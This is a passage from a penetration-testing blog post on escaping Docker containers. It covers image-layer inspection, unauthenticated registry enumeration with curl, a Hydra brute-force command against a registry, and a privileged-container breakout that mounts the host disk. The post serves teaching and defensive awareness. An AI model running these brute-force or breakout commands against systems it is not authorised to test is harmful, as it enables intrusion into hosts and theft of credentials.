@@ -1,0 +1,431 @@
+<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-proxy-endpoint" content="https://ch1mp3y-16053.ew.r.appspot.com/query?id=ag9lfmNoMW1wM3ktMTYwNTNyFQsSCEFwaVF1ZXJ5GICAgOjXh4EKDA"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Escaping Docker containers" /><meta property="og:locale" content="en" /><meta name="description" content="categories: [Knowledge Base] tags: [Docker] —" /><meta property="og:description" content="categories: [Knowledge Base] tags: [Docker] —" /><link rel="canonical" href="http://chimpey.com/posts/Docker/" /><meta property="og:url" content="http://chimpey.com/posts/Docker/" /><meta property="og:site_name" content="Ch1mp3y" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-07-17T10:37:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Escaping Docker containers" /><meta name="twitter:site" content="@twitter_username" /><meta name="google-site-verification" content="7B-MyW0dy3yjVorlhotvBxXrK4v39i4p1OtKCIAUwJE" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-08-08T12:57:31+02:00","datePublished":"2022-07-17T10:37:00+02:00","description":"categories: [Knowledge Base] tags: [Docker] —","headline":"Escaping Docker containers","mainEntityOfPage":{"@type":"WebPage","@id":"http://chimpey.com/posts/Docker/"},"url":"http://chimpey.com/posts/Docker/"}</script><title>Escaping Docker containers | Ch1mp3y</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Ch1mp3y"><meta name="application-name" content="Ch1mp3y"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://ch1mp3y-16053.ew.r.appspot.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://ch1mp3y-16053.ew.r.appspot.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/RECOVER_Chimpey_vierkant6.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Ch1mp3y</a></div><div class="site-subtitle font-italic">Hack all the things!</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/Ch1mp3y" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Escaping Docker containers</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Escaping Docker containers</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1658047020" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jul 17, 2022 </em> </span> <span> Updated <em class="" data-ts="1659956251" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Aug 8, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/username">Ch1mp3y</a> </em> </span><div> <span> <em id="pv" class="pageviews"> <i class="fas fa-spinner fa-spin fa-fw"></i> </em> views </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="4040 words"> <em>22 min</em> read</span></div></div></div><div class="post-content"><hr /><p>categories: [Knowledge Base] tags: [Docker] —</p><p><em>It’s all I hear people talk about these days; ‘Kubernetes’, ‘The Cloud’ which seems to be the final place</em> <em>all the good holy builds go and containerized environments with the name ‘Docker’ in particular.</em></p><p><em>We are going to talk about the latter today.</em></p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 550 377'%3E%3C/svg%3E" data-src="/assets/img/HTB/Docker/docker-logo3.png" alt="Desktop View" width="550" height="377" data-proofer-ignore></p><h2 id="index"><span class="mr-2">Index</span><a href="#index" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><a href="https://ch1mp3y.github.io/posts/Docker/#whats-a-docker">What’s a Docker</a><li><a href="https://ch1mp3y.github.io/posts/Docker/#with-great-power-comes-great-responsibility">With great power comes great responsibility</a><li><a href="https://ch1mp3y.github.io/posts/Docker/#digging-through-image-layers">Digging through image layers</a><ul><li><a href="https://ch1mp3y.github.io/posts/Docker/#using-dive">Using Dive</a></ul><li><a href="https://ch1mp3y.github.io/posts/Docker/#registries">Registries</a><ul><li><a href="https://ch1mp3y.github.io/posts/Docker/#enumerate-through-the-manifest">Enumerate through the manifest</a></ul><li><a href="https://ch1mp3y.github.io/posts/Docker/#breaking-out-of-containers">Breaking out of containers</a><ul><li><a href="https://ch1mp3y.github.io/posts/Docker/#privileged-containers">privileged containers</a><ul><li><a href="https://ch1mp3y.github.io/posts/Docker/#mounting-disk-scenario">Mounting disk scenario </a></ul><li><a href="https://ch1mp3y.github.io/posts/Docker/#capabilities">Capabilities </a><ul><li><a href="https://ch1mp3y.github.io/posts/Docker/#cap_sys_module">CAP_SYS_MODULE </a><li><a href="https://ch1mp3y.github.io/posts/Docker/#dac_read_search">DAC_READ_SEARCH </a></ul><li><a href="https://ch1mp3y.github.io/posts/Docker/#docker-socket-escape">Docker socket escape</a></ul><li><a href="https://ch1mp3y.github.io/posts/Docker/#final-notes">Final Notes</a></ul><h2 id="whats-a-docker"><span class="mr-2">What’s a Docker</span><a href="#whats-a-docker" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Have you ever been in a scenario where you developed an application and you have to share it with a fellow developer? But you created a crappy deployment process and the application doesn’t work on their machine because of a dependency version mismatch. And don’t get me started when the configuration settings of your fellow developer buddy does not match yours. Oh, how many friendships where lost following this tedious process.</p><p>BUT NO MORE! We now have containerized environments and the most popular one by far at this moment is <strong>Docker</strong>.</p><p>So what is it? Well I am glad you asked, curious reader. It’s a platform for building, running and shipping applications in a constant matter. So we can easily create a package (container image) with all that is needed to run the application and run it on any machine with Docker.</p><p>So if it works on your machine, there are no excuses anymore. It’s going to work on every machine. (or atleast machines with the same OS) You just simply tell Docker to bring up the application and Docker will download your image, exactly as it was build.</p><h2 id="with-great-power-comes-great-responsibility"><span class="mr-2">With great power comes great responsibility</span><a href="#with-great-power-comes-great-responsibility" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>So the benefit of Docker is that you don’t have to run the application directly on the host but instead can run the application in it’s own isolated little environment, which sounds like a security benefit to me.</p><p>However, here is the thing: those darn configurations. Any misconfiguration can result in a security downgrade. This can result into the all well known <strong>container escape vulnerabilities</strong>.</p><p>Oh and there is one other thing, containers share the kernel with the host. So this means when using a kernel exploit within the container your host kernel is pretty much doomed as well.</p><p>Pretty serious stuff if you ask me, so let’s jump right to it!</p><p>In the following chapters I’m going to talk about some of these container escape vulnerabilities!</p><h2 id="digging-through-image-layers"><span class="mr-2">Digging through image layers</span><a href="#digging-through-image-layers" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Before we start with the container escape vulnerabilities, first things first.</p><p>To get to the gold, you need to get your hands dirty and dig through some <strong>image layers</strong> first. <br /> Digging through <strong>image layers</strong> can result in finding some juicy stuff like ssh keys, passwords or maybe some developer notes.</p><p>So what is an image layer?</p><p>You have a <strong>Docker container</strong> which is a software package that provides an isolated environment for running applications.<br /> You have an <strong>Image</strong> which is a stand-alone, immutable executable software package that includes everything needed to run an application.</p><p>And then you have the layers. An image consists of <strong>layers</strong>. Each layer is an <strong>intermediate image</strong> that contains the changes made to the image since the last one was added.<br /> Remember, images are immutable, so each change to an existing image creates a new layer. <br /> It’s basically a diff of each change that was made to the container image. Images are built using <strong>Dockerfiles</strong>. These files consist of instructions for Docker on how to built the image. Docker creates a new image (and thus layer) for each instruction in this file. Instructions can be things like copying files or installing OS packages.</p><p>I hope this all make sense. Let it sink in for a while and let’s get down to some action!</p><p>Now how can we dig through layers?</p><p>With the following command you can download an image or a set of images:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>docker pull &lt;image-name&gt;
+</pre></table></code></div></div><p>Container images that have been pulled are not easily inspected, so we need to save the image on our local machine. To do this, use the following command:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>sudo docker save &lt;image-name&gt; -o &lt;image-name&gt;.tar
+</pre></table></code></div></div><p>Next we need to extract the .tar file:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>sudo tar -xvf &lt;image-name&gt;.tar
+</pre></table></code></div></div><p>If all went well you should now see a lot of directories, these are all the image layers we talked about. you can go through all the layers by hand but this could be, depending on the amount of layers, a time consuming task.</p><p>Lucky for us, there is a script for this called <strong>Dive</strong>.</p><h5 id="using-dive"><span class="mr-2">Using Dive</span><a href="#using-dive" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>Install Dive <a href="https://github.com/wagoodman/dive">here</a> and download a Docker image:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>┌──(kali㉿kali)-[~/Documents/Other/]
+└─$ sudo docker pull docker-test.idb:5000/test                                                                                                  1 ⨯
+Using default tag: latest
+latest: Pulling from dive/example
+bb79b6b2107f: Pull complete 
+563c5c58c7e4: Pull complete 
+d0bfbff8c909: Pull complete 
+cadf54e21bb7: Pull complete 
+4b40ce202545: Pull complete 
+8344f1c4be8e: Pull complete 
+6beebab80685: Pull complete 
+</pre></table></code></div></div><p>Next we need the image id:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>┌──(kali㉿kali)-[~/Documents/Other/]
+└─$ sudo docker images                                                                                                                                   1 ⨯
+REPOSITORY                           TAG       IMAGE ID       CREATED         SIZE
+docker-test.idb:5000/dive/test   latest    398724241382   21 months ago   87.1MB
+</pre></table></code></div></div><p>Run Dive by providing the image id:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>┌──(kali㉿kali)-[~/Documents/Other/]
+└─$ dive 398724241382 
+</pre></table></code></div></div><p>Your Dive window should look something like the following:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 718 387'%3E%3C/svg%3E" data-src="/assets/img/HTB/Docker/Dive.PNG" alt="Desktop View" width="718" height="387" data-proofer-ignore></p><p>You can navigate through Dive using the “Up” and “Down” arrow-keys and swap between windows using the tab-key.</p><h2 id="registries"><span class="mr-2">Registries</span><a href="#registries" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Let’s talk a bit about Docker registries. Docker registries are comparable with services such as Github or Gitlab, it’s basically a repository or a collection of repositories used to store and access container images.</p><p>Registries make the lifes of Docker creators a whole lot easier, because with the use of registries they can now switch between multiple versions of their application and share it with other people in a jiffy.</p><p>There is a site called the <a href="https://hub.docker.com/">Docker hub</a>, by default the Docker engine interacts with the Docker Hub, Docker’s public registry instance.</p><p>Not every organization is fond about the idea to disclose their application to the public, so Docker allows you to manage a private registry that acts the same as Docker Hub but resides within the company.</p><p>So why all this jibba jabba about registries? Where is the action? Well since there are more than 100,000 open-source container repositories hosted in the Docker Hub registry, which is open to EVERYONE, it is not hard to imagine that modified and unofficial versions of common images exist, which could contain malicious code.</p><p>Other than that, the registry could contain a lot of delicious information. We could for example (if there is no authentication in place) get the manifest, which contains various pieces of information about the application itself. We can go through the layers as we talked about in the <a href="https://ch1mp3y.github.io/posts/Docker/#digging-through-image-layers">Digging through image layers</a> section. And last but not least, we can upload (or push) our own images to the repository containing malicious code.</p><h5 id="enumerate-through-the-manifest"><span class="mr-2">Enumerate through the manifest</span><a href="#enumerate-through-the-manifest" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>The Docker registry runs by default on port 5000, it is however possible that it runs on some other port. We can easily discover where the service is running by using Nmap. Do note that since it is an HTTP based service it can be behind HTTP proxies, which makes it undetectable for Nmap.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>┌──(kali㉿kali)-[~]
+└─$ sudo nmap -sV -sC -p- docker-test.idb                  
+
+[...]
+5000/tcp open  http    Docker Registry (API: 2.0)
+|_http-title: Site doesn't have a title.
+[...
+
+</pre></table></code></div></div><p>The above Nmap scan discovered a Docker registry but also the API version: <strong>2.0</strong>. This comes in handy when we want to interact with the Docker Registry. Do keep in mind that it is not a website you can browse to, it’s an API that reacts to JSON requests. So to interact with the registry I’m using curl:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>┌──(kali㉿kali)-[~]
+└─$ curl -s http://docker-test.idb:5000/v2/_catalog          
+{"repositories":["Chimpey/Test1"]}
+
+</pre></table></code></div></div><p>If there was any authentication in place you would have received the following response:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>┌──(kali㉿kali)-[~]
+└─$ curl -s http://docker-test.idb:5000/v2/_catalog          
+{"errors":[{"code":"UNAUTHORIZED","message":"authentication required","detail":[{"Type":"registry","Class":"","Name":"catalog","Action":"*"}]}]}
+</pre></table></code></div></div><p>If some authentication is blocking you to get to all the delicious information, you can always try to brute force your way in with <a href="https://www.kali.org/tools/hydra/">Hydra</a>, I got the following example from <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#docker-registry">here</a></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
+</pre></table></code></div></div><p>Anyhow, back to the repository we found, we have a repository named <strong>Chimpey/Test1</strong> in this scenario with no authentication blocking us. But if we want to retrieve the manifest file we need to find a list of tags first. You can do this with the following command:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>┌──(kali㉿kali)-[~]
+└─$ curl -s http://docker-tes.idb:5000/v2/Chimpey/Test1/tags/list
+{"name":"Chimpey/Test1","tags":["hackme"]}
+
+</pre></table></code></div></div><p>With the repository name <strong>Chimpey/Test1</strong> and the tag <strong>hackme</strong> we can now retrieve the manifest file with the following:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>┌──(kali㉿kali)-[~]
+└─$ curl -s http://docker-test.idb:5000/v2/Chimpey/Test1/manifests/hackme           
+</pre></table></code></div></div><p>To keep it nice and clean, I cut out some of the results, but in a real life scenario you will be getting a whole lot more information:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>  "history": [
+      {
+		 [...]
+		 "Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\
+		 "Cmd\":[\"/bin/sh\",\"-c\",\"printf \\\"Username: chimpey\\\\nPassword: I_like_bananas!\\\\n\\\
+		 [...]
+
+</pre></table></code></div></div><p>In this scenario we found a <strong>username:chimpey</strong> and a <strong>password:I_like_bananas!</strong>.</p><p>Checking out the image manifest like this can provide someone with a lot of useful information and is usually worth the effort.</p><h2 id="breaking-out-of-containers"><span class="mr-2">Breaking out of containers</span><a href="#breaking-out-of-containers" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Ah! Finally the real action starts. Let’s get our hands dirty and hack through some misconfigurations.</p><p>I’m going to talk about the following misconfigurations:</p><ul><li><strong>Privileged containers</strong><li><strong>CAP_SYS_MODULE</strong><li><strong>DAC_READ_SEARCH</strong><li><strong>Docker Socket</strong></ul><p>Do bare in mind, this is not the holy grail of Docker misconfigurations, there is a whole lot more out there.</p><h3 id="privileged-containers"><span class="mr-2">privileged containers</span><a href="#privileged-containers" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>You can run containers in two modes: <strong>privileged mode</strong> and <strong>user mode</strong> When you run the container in <strong>user mode</strong> you interact with the operating system through the Docker engine, which is a good way to shield a container from the host machine. With a <strong>privileged</strong> container you have direct communication with the operating system. So if you are the root user in a container you have the root privileges of the host system.</p><p>So how do we know we are actually in a privileged container or even in a container to begin with? Well, ways to check you are actually in a container is for example to check the control groups. Inside a Docker container some control groups will belong to Docker, we can check this by using the following command <code class="language-plaintext highlighter-rouge">cat /proc/1/cgroup</code> If you see the word Docker, well that is a pretty solid indication you are in a Docker container my friend.</p><p>Okay, sweet! We are in a Docker container. But how do we know we are in a privileged container? I always check the capabilities with the following command <code class="language-plaintext highlighter-rouge">capsh --print</code>, if you see a lot of capabilities it’s usually a good indicator that we are in a privileged container. Another good indicator is to check the devices <code class="language-plaintext highlighter-rouge">ls /dev/</code> if you see a lot devices, you are probably in a privileged container. You can also check if you have access to disk devices with <code class="language-plaintext highlighter-rouge">fdisk -l</code></p><p>In the following scenario I will describe how you can get access to the host filesystem when you are in a privileged container.</p><h5 id="mounting-disk-scenario"><span class="mr-2">Mounting disk scenario</span><a href="#mounting-disk-scenario" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>Check the capabilities:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>root@3a8315527c66:~# capsh --print
+Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+eip
+Bounding set = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
+Securebits: 00/0x0/1'b0
+secure-noroot: no (unlocked)
+secure-no-suid-fixup: no (unlocked)
+secure-keep-caps: no (unlocked)
+uid=0(root)
+gid=0(root)
+groups=0(root)
+</pre></table></code></div></div><p>As you can see, we have a lot of capabilities. This means we have a privileged container. How did this happen? Well, this is a container that is launched with the <code class="language-plaintext highlighter-rouge">--privileged</code> flag set. This flag gives basically all capabilities to the container and lifts the limitations by the device cgroup controller. I have noticed I talked about cgroups but have not explained it yet, so here we go:<br /> cgroups, known as control groups is a feature provided by the linux kernel to manage, restrict and audit groups of processes.</p><p>So if the container is launched with the <code class="language-plaintext highlighter-rouge">--privileged</code> flag set, this basically means we have the freedom to do everything that the host can do.</p><p>It’s going to be an easy breeze for us to exploit this from here, so let’s get right into it.</p><p>Since we have all access, let’s see if we can look at the host drive running <code class="language-plaintext highlighter-rouge">fdisk -l</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+</pre><td class="rouge-code"><pre>root@3a8315527c66:~# fdisk -l
+Disk /dev/loop0: 88.5 MiB, 92778496 bytes, 181208 sectors
+Units: sectors of 1 * 512 = 512 bytes
+Sector size (logical/physical): 512 bytes / 512 bytes
+I/O size (minimum/optimal): 512 bytes / 512 bytes
+
+
+Disk /dev/nvme0n1: 1 GiB, 1073741824 bytes, 2097152 sectors
+Units: sectors of 1 * 512 = 512 bytes
+Sector size (logical/physical): 512 bytes / 512 bytes
+I/O size (minimum/optimal): 512 bytes / 512 bytes
+
+
+Disk /dev/nvme1n1: 10 GiB, 10737418240 bytes, 20971520 sectors
+Units: sectors of 1 * 512 = 512 bytes
+Sector size (logical/physical): 512 bytes / 512 bytes
+I/O size (minimum/optimal): 512 bytes / 512 bytes
+Disklabel type: gpt
+Disk identifier: 17BFD2F3-4CE7-47B9-A5CE-8050EF005A35
+
+Device         Start      End  Sectors Size Type
+/dev/sda1       2048     4095     2048   1M BIOS boot
+/dev/sda2       4096 20969471 20965376  10G Linux filesystem
+
+</pre></table></code></div></div><p>We see a device running the host filesystem: <strong>/dev/sda2</strong>. So how do we get onto the host filesystem? There are multiple ways but I find it the easiest by just mounting the file system.</p><p>So let’s do that, create a folder and mount <strong>/dev/sda2/</strong> to that folder:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>root@3a8315527c66:~# mkdir -p /mnt/hackedy
+root@3a8315527c66:~# mount /dev/sda2 /mnt/hackedy
+</pre></table></code></div></div><p>As you can see we can now access the host file system:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>root@3a8315527c66:/mnt/hackedy# ls
+bin   cdrom  etc   initrd.img      lib    lost+found  mnt  proc  run   snap  swap.img  tmp  var      vmlinuz.old
+boot  dev    home  initrd.img.old  lib64  media       opt  root  sbin  srv   sys       usr  vmlinuz
+
